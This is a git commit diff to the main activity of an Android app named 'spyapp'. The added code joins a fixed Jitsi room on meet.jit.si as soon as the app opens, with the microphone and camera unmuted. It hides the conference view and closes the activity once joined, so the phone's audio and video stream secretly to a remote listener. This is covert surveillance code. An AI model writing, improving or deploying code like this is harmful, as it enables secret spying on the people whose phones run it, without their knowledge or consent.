774393d00fbef2b25de9afac00d018f4b2e56176
Aydin Polat <maill>
2022-11-12 21:13:54 +0300

    Made several changes

--- app/src/main/java/com/pozetech/spyapp/MainActivity.kt
+++ app/src/main/java/com/pozetech/spyapp/MainActivity.kt
@@ -1,13 +1,13 @@
 package com.pozetech.spyapp
 
-import android.content.Intent
 import android.os.Bundle
+import android.view.View
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.content.ContextCompat
 import com.facebook.react.modules.core.PermissionListener
 import com.pozetech.spyapp.databinding.ActivityMainBinding
 import org.jitsi.meet.sdk.*
 import java.net.URL
+import java.util.*
 
 
 class MainActivity : AppCompatActivity(), JitsiMeetActivityInterface {
@@ -17,28 +17,37 @@ class MainActivity : AppCompatActivity(), JitsiMeetActivityInterface {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        binding.listenButton.setOnClickListener {
-            val jitsiUser = JitsiMeetUserInfo()
-            jitsiUser.displayName = "sakfmasfasf"
-            val view = JitsiMeetView(this)
-            val option = JitsiMeetConferenceOptions.Builder()
-                .setServerURL(URL("https://meet.jit.si/aasdjghfsdljgdshgk#config.prejoinPageEnabled=false"))
-                .setRoom("mySpyRoom")
-                .setAudioMuted(false)
-                .setVideoMuted(true)
-                .setUserInfo(jitsiUser)
-                .build()
-            view.join(option)
-            setContentView(view)
+        val randomName = UUID.randomUUID().toString()
+        val jitsiUser = JitsiMeetUserInfo()
+        jitsiUser.displayName = randomName
+
+        val view = JitsiMeetView(this@MainActivity)
+        val option = JitsiMeetConferenceOptions.Builder()
+            .setServerURL(URL("https://meet.jit.si/aasdjghfsdljgdshgk#config.prejoinPageEnabled=false"))
+            .setRoom("mySpyRoom")
+            .setAudioMuted(false)
+            .setVideoMuted(false)
+            .setUserInfo(jitsiUser)
+            .build()
+        view.join(option)
+        view.visibility = View.INVISIBLE
+        view.listener = object : JitsiMeetViewListener {
+            override fun onConferenceJoined(p0: MutableMap<String, Any>?) {
+                this@MainActivity.finish()
+            }
+
+            override fun onConferenceTerminated(p0: MutableMap<String, Any>?) {
+
+            }
+
+            override fun onConferenceWillJoin(p0: MutableMap<String, Any>?) {
+
+            }
+
         }
-        setService()
-    }
+        setContentView(view)
 
-    private fun setService() {
-        val serviceIntent = Intent(this,ListenerService::class.java)
-        ContextCompat.startForegroundService(this,serviceIntent)
     }
-
 
     override fun requestPermissions(p0: Array<out String>?, p1: Int, p2: PermissionListener?) {
 
